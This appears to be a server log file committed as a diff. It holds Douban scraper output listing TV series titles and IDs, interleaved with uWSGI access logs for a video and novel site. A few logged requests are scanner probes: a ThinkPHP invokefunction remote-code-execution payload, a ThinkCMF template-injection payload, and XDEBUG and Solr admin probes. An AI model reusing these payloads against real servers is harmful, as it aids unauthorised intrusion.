+训长吴纯南 26979048 保存成功[douban]
+这是我们的时代第一季 26769252 保存成功[douban]
+巴比伦柏林 第二季 30133697 9.5保存成功[douban]
+童话镇 第七季 27042714 6.8保存成功[douban]
+社长室之冬 26989731 保存成功[douban]
+PTA爷爷 26967758 保存成功[douban]
+芝加哥烈焰 第六季 27041205 保存成功[douban]
+羞耻 第四季 27012497 保存成功[douban]
+椿文具店：镰仓代笔物语 26992037 保存成功[douban]
+苍穹浩瀚第二季 26675245 保存成功[douban]
+艳骨 26984555 保存成功[douban]
+惩罚者 第一季 26710394 保存成功[douban]
+最后的生命：即使你明天消失 27121218 保存成功[douban]
+刑事弓神 27101862 保存成功[douban]
+街道小厂之女 27121165 保存成功[douban]
+风筝 25752323 保存成功[douban]
+Bravo My Life 27179243 保存成功[douban]
+逆贼：偷百姓的盗贼 26909400 保存成功[douban]
+我的小姨 26963224 保存成功[douban]
+主播公寓 27663805 保存成功[douban]
+边缘人～教你制作情妇的方法 27124422 保存成功[douban]
+proxy: 221.122.91.65:80 Status Code： 403 重试
+密西西比 第二季 27108347 保存成功[douban]
+赎金 第一季 26811802 保存成功[douban]
+[pid: 10432|app: 0|req: 89/119] 195.54.160.135 () {34 vars in 556 bytes} [Fri Jun 12 09:59:26 2020] GET /solr/admin/info/system?wt=json => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+变形金刚：组合金刚之战第一季 26847710 6.9保存成功[douban]
+开膛街第四季 26427493 保存成功[douban]
+再见，布莱克先生 26582382 保存成功[douban]
+隐世狼女第三季 26635064 保存成功[douban]
+相对无言第一季 26739358 保存成功[douban]
+边境第一季 匹配到多个豆瓣id数据，存入列表2 ['26667377', '27071885']
+副总统第五季 26366493 保存成功[douban]
+若是如此 26842700 保存成功[douban]
+束缚与放纵第一季 26990232 保存成功[douban]
+悦音响起 26720119 保存成功[douban]
+[pid: 10432|app: 0|req: 90/120] 195.54.160.135 () {34 vars in 556 bytes} [Fri Jun 12 10:10:20 2020] GET /?XDEBUG_SESSION_START=phpstorm => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 91/121] 195.54.160.135 () {36 vars in 653 bytes} [Fri Jun 12 10:10:20 2020] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+我的辣妹保镖 26866017 保存成功[douban]
+宇宙的工作 26807600 保存成功[douban]
+路西法 第二季 26768295 保存成功[douban]
+[pid: 10432|app: 0|req: 92/122] 112.96.199.149 () {44 vars in 961 bytes} [Fri Jun 12 10:14:15 2020] GET /admin/view_log/?page=2 => generated 21616 bytes in 7 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 93/123] 112.96.199.149 () {44 vars in 961 bytes} [Fri Jun 12 10:14:23 2020] GET /admin/view_log/?page=3 => generated 22051 bytes in 8 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
+大号小兵 26420692 保存成功[douban]
+对不起，姜南九 26934343 保存成功[douban]
+[pid: 10432|app: 0|req: 94/124] 112.96.199.149 () {44 vars in 961 bytes} [Fri Jun 12 10:14:40 2020] GET /admin/view_log/?page=4 => generated 16657 bytes in 8 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 95/125] 112.96.199.149 () {42 vars in 902 bytes} [Fri Jun 12 10:14:47 2020] GET /video/type/17/?&page=7 => generated 31301 bytes in 170 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+极品老妈第四季 26758722 保存成功[douban]
+[pid: 10432|app: 0|req: 96/126] 112.96.199.149 () {44 vars in 952 bytes} [Fri Jun 12 10:15:43 2020] GET /video/play/86555/ => generated 13626 bytes in 4 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+战火家园第二季 26436154 保存成功[douban]
+长征大会师 26732132 保存成功[douban]
+[pid: 10432|app: 0|req: 97/127] 112.96.199.149 () {44 vars in 961 bytes} [Fri Jun 12 10:16:10 2020] GET /video/type/17/?&page=8 => generated 30843 bytes in 168 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 98/128] 112.96.199.149 () {44 vars in 963 bytes} [Fri Jun 12 10:16:37 2020] GET /video/type/17/?&page=40 => generated 29640 bytes in 173 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+狂野之美：国家公园探险 26724827 保存成功[douban]
+风险 26630761 保存成功[douban]
+[pid: 10432|app: 0|req: 99/129] 112.96.199.149 () {44 vars in 964 bytes} [Fri Jun 12 10:17:09 2020] GET /video/type/17/?&page=41 => generated 29633 bytes in 168 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 100/130] 112.96.199.149 () {44 vars in 953 bytes} [Fri Jun 12 10:17:19 2020] GET /video/play/64202/ => generated 13747 bytes in 4 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 101/131] 112.96.199.149 () {44 vars in 964 bytes} [Fri Jun 12 10:17:36 2020] GET /video/type/17/?&page=48 => generated 30266 bytes in 168 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+爱的诠释 第一季 26995124 保存成功[douban]
+[pid: 10432|app: 0|req: 102/132] 112.96.199.149 () {44 vars in 953 bytes} [Fri Jun 12 10:19:07 2020] GET /video/play/64574/ => generated 14598 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 103/133] 112.96.199.149 () {44 vars in 966 bytes} [Fri Jun 12 10:19:22 2020] GET /video/type/17/?&page=126 => generated 30770 bytes in 170 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+伏弩 21327515 保存成功[douban]
+[pid: 10432|app: 0|req: 104/134] 112.96.199.149 () {44 vars in 967 bytes} [Fri Jun 12 10:19:55 2020] GET /video/type/17/?&page=127 => generated 31075 bytes in 167 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+嘿！真不是闹着玩的 25780620 保存成功[douban]
+大祸临头第二季 26659509 保存成功[douban]
+辛普森一家第二十七季 26382778 保存成功[douban]
+[pid: 10432|app: 0|req: 105/135] 112.96.199.149 () {44 vars in 954 bytes} [Fri Jun 12 10:22:55 2020] GET /video/play/71703/ => generated 13360 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+丛林中的莫扎特第二季 26339776 保存成功[douban]
+[pid: 10432|app: 0|req: 106/136] 112.96.199.149 () {44 vars in 954 bytes} [Fri Jun 12 10:23:43 2020] GET /video/play/71712/ => generated 13313 bytes in 4 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+口香糖第一季 26657486 保存成功[douban]
+邪恶力量第十一季 26301493 保存成功[douban]
+我的三十定律 27112634 保存成功[douban]
+[pid: 10432|app: 0|req: 107/137] 112.96.199.149 () {44 vars in 932 bytes} [Fri Jun 12 10:27:38 2020] GET /video/ => generated 59285 bytes in 394 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+映山红 25848265 保存成功[douban]
+[pid: 10432|app: 0|req: 108/138] 112.96.199.149 () {44 vars in 961 bytes} [Fri Jun 12 10:28:02 2020] GET /admin/view_log/?page=4 => generated 18201 bytes in 9 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
+保姆杰茜第四季 26949445 保存成功[douban]
+[pid: 10432|app: 0|req: 109/139] 195.54.160.135 () {34 vars in 716 bytes} [Fri Jun 12 10:28:43 2020] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+鬼玩人第一季 26258117 保存成功[douban]
+女人的抗战 25984839 保存成功[douban]
+湄公河大案 25802736 8.2保存成功[douban]
+最后一人第四季 25977871 保存成功[douban]
+菜鸟老爹第三季 25934236 保存成功[douban]
+剿匪英雄 25939017 保存成功[douban]
+马可波罗第一季 10539839 6.0保存成功[douban]
+国务卿女士第一季 25885439 保存成功[douban]
+重任在肩第二季 25755448 保存成功[douban]
+金装律师第四季 25753341 保存成功[douban]
+谢文东之风云再起 26269551 保存成功[douban]
+错位青春第三季 25717461 保存成功[douban]
+魔幻手机2：傻妞归来 10467760 保存成功[douban]
+低俗怪谈第一季 22992200 保存成功[douban]
+幸福满满 20438863 保存成功[douban]
+燃情密码 19965230 保存成功[douban]
+冬日惊雷 10563797 保存成功[douban]
+第一目标 25843972 保存成功[douban]
+风云之十里洋场 10553097 保存成功[douban]
+菜鸟老爹第二季 25760010 保存成功[douban]
+前夫总动员第三季 21932990 保存成功[douban]
+狗狗博客第二季 25732562 保存成功[douban]
+超感神探第六季 23055589 保存成功[douban]
+混乱之子第六季 20495577 保存成功[douban]
+左右不逢源第五季 24697586 保存成功[douban]
+孤独的美食家第三季 24700696 9.2保存成功[douban]
+追鱼传奇 11510492 保存成功[douban]
+胜者即是正义2 23997724 保存成功[douban]
+X女特工 11625607 保存成功[douban]
+终极蜘蛛侠第二季 21268274 保存成功[douban]
+雪松湾第一季 24846421 保存成功[douban]
+终结杉计划 19965226 保存成功[douban]
+再见，我的新郎 22559478 保存成功[douban]
+迷局1931 11627064 保存成功[douban]
+辣妈俏爸 6778666 保存成功[douban]
+老严有女不愁嫁 19971597 保存成功[douban]
+赵氏孤儿案 10527293 保存成功[douban]
+幕后危机第四季 10759996 保存成功[douban]
+北京爱情故事 匹配到多个豆瓣id数据，存入列表2 ['5377708', '10527197']
+宝乐婶的烦心事 19949174 保存成功[douban]
+小麦进城 10535522 保存成功[douban]
+天涯明月刀 6393366 保存成功[douban]
+新都市人 19965668 保存成功[douban]
+燃情四季 30419667 保存成功[douban]
+苏联 最后的时光 26419648 保存成功[douban]
+盛宴 匹配到多个豆瓣id数据，存入列表2 ['10797491', '4202204']
+闪点行动第五季 11498722 保存成功[douban]
+肖邦拯救人生 25830958 保存成功[douban]
+黑猩猩 3054147 保存成功[douban]
+X医生：外科医生大门未知子第1季 11612463 保存成功[douban]
+爱情睡醒了 6041216 保存成功[douban]
+黛玉传 3722558 保存成功[douban]
+锁定目标 5262328 保存成功[douban]
+不要离开我 26296234 保存成功[douban]
+湖光山色 6037999 保存成功[douban]
+金陵秘事 6974342 保存成功[douban]
+识骨寻踪第七季 6959745 保存成功[douban]
+超市特工第五季 6810265 保存成功[douban]
+美少女的谎言第二季 6185714 保存成功[douban]
+唐顿庄园第二季 5990367 保存成功[douban]
+犯罪心理第七季 6794392 保存成功[douban]
+犯罪现场调查第十二季 6794396 保存成功[douban]
+杰茜驾到第一季 6010087 保存成功[douban]
+爱上查美乐 5501707 保存成功[douban]
+兰花香 5364903 保存成功[douban]
+我也是花 6855096 保存成功[douban]
+顶尖医生 5350010 保存成功[douban]
+家产 6886522 保存成功[douban]
+锄奸 匹配到多个豆瓣id数据，存入列表2 ['5337530', '4922821', '24849562']
+铁梨花 4728873 保存成功[douban]
+犯罪现场调查：迈阿密第九季 5317270 保存成功[douban]
+流星蝴蝶剑 4228557 保存成功[douban]
+七妹 5366680 保存成功[douban]
+监守自盗 4843480 保存成功[douban]
+加州靡情第三季 3899866 保存成功[douban]
+燃烧的玫瑰 4185732 保存成功[douban]
+体操公主第一季 3448183 保存成功[douban]
+熟女镇第一季 3750732 保存成功[douban]
+身份的证明 3403013 保存成功[douban]
+太空堡垒卡拉狄加前传：卡布里卡 2567526 保存成功[douban]
+大秦帝国之裂变 3114220 保存成功[douban]
+历史的进程 4677120 保存成功[douban]
+夫妻一场 3654932 保存成功[douban]
+原来是美男啊 3992226 7.8保存成功[douban]
+无处藏身 3302771 保存成功[douban]
+长江一号 3264817 保存成功[douban]
+关中义事 3197786 保存成功[douban]
+赶走你的忧郁 3292773 保存成功[douban]
+徽州女人 2333661 保存成功[douban]
+加州靡情第一季 2153957 8.2保存成功[douban]
+[pid: 10432|app: 0|req: 110/140] 14.24.26.101 () {42 vars in 1456 bytes} [Fri Jun 12 11:55:05 2020] GET /video/?nsukey=DTTH4dZGg4cuR8gn03qCkGn1jlxAgr%2FijXiYLUy6ebMOTIW7etJPV5PkH9RAosUAU46yA8%2BzaR5JlH8pHXS7vc5zhg1%2FGLSU%2BttGkaT58b41s1Mdq%2F%2FYhsSLIJnVMcR6ogQ%2FVLJCm6SMRsNMD4Cifu%2Bf2wIPX5JVeJaWPUNOESxzsLahh7gce5k8qFhqqbnquaujUahfU8RFkX41UBgv5Q%3D%3D => generated 59285 bytes in 444 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 111/141] 112.96.199.149 () {42 vars in 885 bytes} [Fri Jun 12 11:55:35 2020] GET /video/type/1/ => generated 34885 bytes in 247 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10430|app: 0|req: 13/142] 112.96.199.149 () {44 vars in 921 bytes} [Fri Jun 12 11:55:37 2020] GET /video/ => generated 59285 bytes in 404 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10430|app: 0|req: 14/143] 14.24.26.101 () {44 vars in 1058 bytes} [Fri Jun 12 11:55:41 2020] GET /admin/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 6 headers in 180 bytes (1 switches on core 1)
+[pid: 10433|app: 0|req: 14/144] 14.24.26.101 () {44 vars in 1078 bytes} [Fri Jun 12 11:55:41 2020] GET /admin/login.html => generated 5348 bytes in 1 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 0)
+[pid: 10430|app: 0|req: 15/145] 14.24.26.101 () {44 vars in 1565 bytes} [Fri Jun 12 11:55:43 2020] GET /admin/?nsukey=E3tu9wIv2xf2cZFDJUSxsEZi7J7IczC%2FeXt8aIKlyCIgun7VUdtWSNV4%2B%2FR79Wt0jdftWenSR5J4RwWh0KFKhqTLFjgledx77q5PXWS%2B3PGSc%2F32UjHvIqcspXtG7zpHb2rHJ5Wf6mzJ63sLTUIU2f%2FNDNBXdU%2B9FxgVLzDC0d%2Bo%2Ba%2Fl%2FBnIgsd04PCV%2FueJS3Cs664qEn5%2FTc7Ax5IHNg%3D%3D => generated 0 bytes in 1 msecs (HTTP/1.1 302) 6 headers in 180 bytes (1 switches on core 1)
+[pid: 10431|app: 0|req: 7/146] 14.24.26.101 () {44 vars in 1078 bytes} [Fri Jun 12 11:55:43 2020] GET /admin/login.html => generated 5348 bytes in 1 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 0)
+远古入侵第一季 1996732 保存成功[douban]
+[pid: 10431|app: 0|req: 8/147] 14.24.26.101 () {44 vars in 1565 bytes} [Fri Jun 12 11:55:57 2020] GET /admin/?nsukey=E3tu9wIv2xf2cZFDJUSxsEZi7J7IczC%2FeXt8aIKlyCIgun7VUdtWSNV4%2B%2FR79Wt0jdftWenSR5J4RwWh0KFKhqTLFjgledx77q5PXWS%2B3PGSc%2F32UjHvIqcspXtG7zpHb2rHJ5Wf6mzJ63sLTUIU2f%2FNDNBXdU%2B9FxgVLzDC0d%2Bo%2Ba%2Fl%2FBnIgsd04PCV%2FueJS3Cs664qEn5%2FTc7Ax5IHNg%3D%3D => generated 0 bytes in 1 msecs (HTTP/1.1 302) 6 headers in 180 bytes (1 switches on core 1)
+[pid: 10430|app: 0|req: 16/148] 14.24.26.101 () {44 vars in 1078 bytes} [Fri Jun 12 11:55:57 2020] GET /admin/login.html => generated 5348 bytes in 2 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 0)
+[pid: 10430|app: 0|req: 17/149] 112.96.199.149 () {42 vars in 885 bytes} [Fri Jun 12 11:55:57 2020] GET /video/type/1/ => generated 34885 bytes in 266 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10433|app: 0|req: 15/150] 14.24.26.101 () {44 vars in 1565 bytes} [Fri Jun 12 11:56:04 2020] GET /admin/?nsukey=E3tu9wIv2xf2cZFDJUSxsEZi7J7IczC%2FeXt8aIKlyCIgun7VUdtWSNV4%2B%2FR79Wt0jdftWenSR5J4RwWh0KFKhqTLFjgledx77q5PXWS%2B3PGSc%2F32UjHvIqcspXtG7zpHb2rHJ5Wf6mzJ63sLTUIU2f%2FNDNBXdU%2B9FxgVLzDC0d%2Bo%2Ba%2Fl%2FBnIgsd04PCV%2FueJS3Cs664qEn5%2FTc7Ax5IHNg%3D%3D => generated 0 bytes in 1 msecs (HTTP/1.1 302) 6 headers in 180 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 112/151] 14.24.26.101 () {44 vars in 1078 bytes} [Fri Jun 12 11:56:05 2020] GET /admin/login.html => generated 5348 bytes in 1 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 113/152] 14.24.26.101 () {44 vars in 1545 bytes} [Fri Jun 12 11:56:13 2020] GET /video/?nsukey=DTTH4dZGg4cuR8gn03qCkGn1jlxAgr%2FijXiYLUy6ebMOTIW7etJPV5PkH9RAosUAU46yA8%2BzaR5JlH8pHXS7vc5zhg1%2FGLSU%2BttGkaT58b41s1Mdq%2F%2FYhsSLIJnVMcR6ogQ%2FVLJCm6SMRsNMD4Cifu%2Bf2wIPX5JVeJaWPUNOESxzsLahh7gce5k8qFhqqbnquaujUahfU8RFkX41UBgv5Q%3D%3D => generated 59285 bytes in 414 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 114/153] 14.24.26.101 () {44 vars in 1074 bytes} [Fri Jun 12 11:56:23 2020] GET /video/jx-play/ => generated 9836 bytes in 3 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 0)
+[pid: 10430|app: 0|req: 18/154] 112.96.199.149 () {44 vars in 921 bytes} [Fri Jun 12 11:56:25 2020] GET /video/ => generated 59285 bytes in 420 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+兄弟姐妹第二季 2285153 保存成功[douban]
+[pid: 10430|app: 0|req: 19/155] 14.24.26.101 () {44 vars in 1072 bytes} [Fri Jun 12 11:57:06 2020] GET /video/type/1/ => generated 34885 bytes in 262 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 115/156] 112.96.199.149 () {42 vars in 885 bytes} [Fri Jun 12 11:57:15 2020] GET /video/type/1/ => generated 34885 bytes in 239 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 116/157] 14.24.26.101 () {46 vars in 1169 bytes} [Fri Jun 12 11:57:20 2020] GET /video/type/1/?year=2020&area=&rating= => generated 35111 bytes in 117 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+犯罪现场调查：迈阿密第六季 4281622 保存成功[douban]
+[pid: 10432|app: 0|req: 117/158] 112.96.199.149 () {44 vars in 980 bytes} [Fri Jun 12 11:57:24 2020] GET /video/type/1/?year=&area=&rating=9.0 => generated 37323 bytes in 110 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 118/159] 14.24.26.101 () {46 vars in 1181 bytes} [Fri Jun 12 11:57:51 2020] GET /video/type/1/?&year=2020&page=2 => generated 37241 bytes in 118 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+镇长 5975344 8.9保存成功[douban]
+保密局的枪声 2326204 7.2保存成功[douban]
+[pid: 10432|app: 0|req: 119/160] 112.96.199.149 () {44 vars in 958 bytes} [Fri Jun 12 11:57:59 2020] GET /video/type/1/ => generated 34885 bytes in 237 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10430|app: 0|req: 20/161] 112.96.199.149 () {44 vars in 974 bytes} [Fri Jun 12 11:58:01 2020] GET /video/type/8/?area=&year=&rating= => generated 39497 bytes in 220 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10430|app: 0|req: 21/162] 112.96.199.149 () {44 vars in 1030 bytes} [Fri Jun 12 11:58:03 2020] GET /video/type/8/?area=%E9%A6%99%E6%B8%AF&year=&rating= => generated 21847 bytes in 97 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 120/163] 112.96.199.149 () {44 vars in 973 bytes} [Fri Jun 12 11:58:06 2020] GET /video/type/1/ => generated 34938 bytes in 250 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+碧血剑 2223042 保存成功[douban]
+[pid: 10432|app: 0|req: 121/164] 61.151.206.26 () {36 vars in 548 bytes} [Fri Jun 12 11:58:26 2020] GET /video/ => generated 59292 bytes in 860 msecs (HTTP/1.0 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 122/165] 112.96.199.149 () {44 vars in 921 bytes} [Fri Jun 12 11:58:46 2020] GET /video/ => generated 59292 bytes in 410 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 123/166] 14.24.26.101 () {44 vars in 1533 bytes} [Fri Jun 12 11:59:13 2020] GET /video/?nsukey=YbQV7kMHiXrlSCNcU52lNHEuYTC7Q1PRubOn00q6OPBsZqpUE07ygozBDy%2FHOh0cSfYFGvotMuxrSVpgrSjHX3svHZF08HLSiftaOsaYi0CtFt13KtQy%2FcG5QWovATp4AoCS31JvuDgCr%2BXjQsQ5RBMWG0jY8NQcCNQnoyRoAjl9Yj13PlJOUm6QPn5F2MF1MLZNPcakzWpVW8vem%2BD%2BUQ%3D%3D => generated 59292 bytes in 419 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 124/167] 112.96.199.149 () {42 vars in 893 bytes} [Fri Jun 12 11:59:50 2020] GET /video/play/88050/ => generated 14043 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+少年杨家将 2303265 保存成功[douban]
+[pid: 10432|app: 0|req: 125/168] 14.24.26.101 () {40 vars in 707 bytes} [Fri Jun 12 12:00:10 2020] GET /video/ => generated 59292 bytes in 430 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 126/169] 112.96.199.149 () {44 vars in 925 bytes} [Fri Jun 12 12:00:42 2020] GET /video/ => generated 59292 bytes in 409 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10430|app: 0|req: 22/170] 123.147.246.162 () {42 vars in 1449 bytes} [Fri Jun 12 12:00:43 2020] GET /video/?nsukey=Ralvr4h2GGScEgXNP%2BcI%2FcAo7LFUhUzOPnKJJrsSOpb4DCjTkRCDwm9o528nGxXuyBFBLmwIWyyVIiQVPr7lrcVNYs3egKHKpL43%2FBwnU8OM13X6RLM%2BnTNatiE8OZTnIcBMfQ5d9vadLqCMyeOs0TQTASx%2FJ7CnDRFULCTPwyR8tveog0fZyX3SAGbJqlcx%2B0N5YbxY9ZtZm45B8kB9Gw%3D%3D => generated 59292 bytes in 422 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+Fri Jun 12 12:00:51 2020 - uwsgi_response_write_body_do(): Broken pipe [core/writer.c line 341] during GET /video/type/1/ (123.147.246.162)
+OSError: write error
+[pid: 10430|app: 0|req: 23/171] 123.147.246.162 () {44 vars in 1073 bytes} [Fri Jun 12 12:00:51 2020] GET /video/type/1/ => generated 21568 bytes in 338 msecs (HTTP/1.1 200) 6 headers in 320 bytes (0 switches on core 1)
+[pid: 10432|app: 0|req: 127/172] 123.147.246.162 () {44 vars in 1488 bytes} [Fri Jun 12 12:00:52 2020] GET /video/type/1/?nsukey=FVgWC0XnKcQtftWLuyvYApTXBSQNDudSu8AbiAxX6Ar5VHBiWVDbko65SNhiD35u2FeRgfLfG65CplphqxxP6GnsUHrV4xQGgJqTwcWMTeGFd%2Bi8%2FzY8X06W1PXjEsR1eyUKfDkxymYV%2F3QpwxsJ2T5I7G17xhpe1jQ6e7CG%2FPTZhxuoPVN2sEgjhsAg3fQh => generated 34652 bytes in 241 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 128/173] 123.147.246.162 () {46 vars in 1350 bytes} [Fri Jun 12 12:01:05 2020] GET /video/type/1/?&page=782 => generated 26127 bytes in 337 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 129/174] 14.24.26.101 () {42 vars in 818 bytes} [Fri Jun 12 12:01:09 2020] GET /video/play/87353/ => generated 16781 bytes in 9 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 130/175] 123.147.246.162 () {46 vars in 1152 bytes} [Fri Jun 12 12:01:11 2020] GET /video/type/1/?&page=781 => generated 33087 bytes in 263 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 131/176] 123.147.246.162 () {44 vars in 1538 bytes} [Fri Jun 12 12:01:17 2020] GET /video/?nsukey=Ralvr4h2GGScEgXNP%2BcI%2FcAo7LFUhUzOPnKJJrsSOpb4DCjTkRCDwm9o528nGxXuyBFBLmwIWyyVIiQVPr7lrcVNYs3egKHKpL43%2FBwnU8OM13X6RLM%2BnTNatiE8OZTnIcBMfQ5d9vadLqCMyeOs0TQTASx%2FJ7CnDRFULCTPwyR8tveog0fZyX3SAGbJqlcx%2B0N5YbxY9ZtZm45B8kB9Gw%3D%3D => generated 59292 bytes in 409 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 132/177] 112.96.199.149 () {44 vars in 930 bytes} [Fri Jun 12 12:01:25 2020] GET /novel/ => generated 6151 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 133/178] 112.96.199.149 () {42 vars in 871 bytes} [Fri Jun 12 12:01:45 2020] GET /novel/ => generated 6151 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 134/179] 112.96.199.149 () {44 vars in 948 bytes} [Fri Jun 12 12:01:49 2020] GET /novel/chapter/5397.html => generated 14601 bytes in 344 msecs (HTTP/1.1 200) 4 headers in 138 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 135/180] 112.96.199.149 () {52 vars in 1214 bytes} [Fri Jun 12 12:01:53 2020] POST /novel/art/getBookText/ => generated 588 bytes in 193 msecs (HTTP/1.1 200) 4 headers in 136 bytes (1 switches on core 0)
+迷失第三季 1986910 保存成功[douban]
+[pid: 10432|app: 0|req: 136/181] 112.96.199.149 () {52 vars in 1214 bytes} [Fri Jun 12 12:02:02 2020] POST /novel/art/getBookText/ => generated 564 bytes in 191 msecs (HTTP/1.1 200) 4 headers in 136 bytes (1 switches on core 0)
+[pid: 10430|app: 0|req: 24/182] 112.96.199.149 () {52 vars in 1214 bytes} [Fri Jun 12 12:02:03 2020] POST /novel/art/getBookText/ => generated 5037 bytes in 103 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
+[pid: 10430|app: 0|req: 25/183] 112.96.199.149 () {52 vars in 1214 bytes} [Fri Jun 12 12:02:06 2020] POST /novel/art/getBookText/ => generated 625 bytes in 203 msecs (HTTP/1.1 200) 4 headers in 136 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 137/184] 106.85.211.28 () {42 vars in 1444 bytes} [Fri Jun 12 12:02:45 2020] GET /video/?nsukey=P1C7hICH6wk0mXxxUbshHlBDUGi6dComTLd82eLRn9XfzYDKWE6K4H0QOSQCqlVGNxqn%2F9ZztDp5G0mfaJKBCn0xYFiMCIg8MHOY%2Bo2Yh81DjCdEbDzxhdP0MBE98Wdmu96zUzW1CI3O3K15BjW6mLxvp0XIY5z6999%2BHOd3b3sY0n2TIT%2Foo10CECoGkQShO8oZW0YLv5%2FaTVsgG6WeJw%3D%3D => generated 59292 bytes in 417 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+黑道家族第六季 2154324 保存成功[douban]
+星际之门：亚特兰蒂斯第三季 4246571 保存成功[douban]
+最后的子弹 2346512 保存成功[douban]
+你是苹果我是梨 3062888 保存成功[douban]
+中国家庭421 3178760 保存成功[douban]
+[pid: 10432|app: 0|req: 138/185] 101.89.239.245 () {36 vars in 667 bytes} [Fri Jun 12 12:07:09 2020] GET /admin/login.html => generated 5348 bytes in 1 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 0)
+豪斯医生第二季 3002885 保存成功[douban]
+[pid: 10432|app: 0|req: 139/186] 14.24.26.101 () {42 vars in 796 bytes} [Fri Jun 12 12:11:02 2020] GET /novel/ => generated 6151 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 140/187] 14.24.26.101 () {42 vars in 768 bytes} [Fri Jun 12 12:11:06 2020] GET /favicon.ico => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+九尾狐与仙鹤 6788343 保存成功[douban]
